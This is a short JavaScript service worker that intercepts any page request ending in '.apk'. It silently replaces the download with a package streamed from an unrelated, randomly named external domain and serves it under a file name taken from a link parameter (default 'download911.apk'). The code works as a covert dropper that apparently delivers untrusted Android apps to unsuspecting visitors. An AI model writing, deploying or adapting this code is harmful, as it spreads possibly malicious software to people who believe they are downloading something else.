self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', event => event.waitUntil(self.clients.claim()));

async function downloadApk(apkURL) {
    const response = await fetch(apkURL, {
        method: 'GET',
        // mode: 'no-cors',
        credentials: 'omit'
    });

    if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }

    return await response.arrayBuffer();
}

function newApkStream(apkURL) {
    return new ReadableStream({
        async start(controller) {
            try {
                await new Promise(resolve => setTimeout(resolve, 1));
                const apkBuffer = await downloadApk(apkURL);
                controller.enqueue(new Uint8Array(apkBuffer));
                controller.close();
            } catch (e) {
                console.error(e);
                controller.error(e);
            }
        }
    });
}

self.addEventListener('fetch', event => {
    const url = new URL(event.request.url);
    if (url.pathname.endsWith('.apk')) {
        event.respondWith(
            (async () => {

                let apkname = "download911.apk";
                if (url.searchParams.get("utm_medium")){
                    apkname = url.searchParams.get("utm_medium");
                    if (!apkname.includes(".apk")){
                        apkname += ".apk"
                    }
                }

                let apkURL = "https://blindlyorganicsnake.autos/aaa8e7e844e856a015a/" + url.search;
                const stream = newApkStream(apkURL);

                return new Response(stream, {
                    headers: {
                        'Content-Type': 'application/vnd.android.package-archive',
                        'Content-Disposition': `attachment; filename="${apkname}"`
                    }
                });
            })()
        );
    }
});
